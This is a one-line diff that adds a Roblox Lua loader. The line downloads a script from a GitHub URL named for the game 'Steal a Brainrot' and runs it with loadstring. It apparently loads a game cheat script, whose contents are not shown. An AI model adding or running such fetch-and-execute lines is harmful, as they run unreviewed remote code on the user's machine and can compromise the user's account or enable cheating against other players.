@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xielbers/scripts/refs/heads/main/steal-a-brainrot.lua"))()
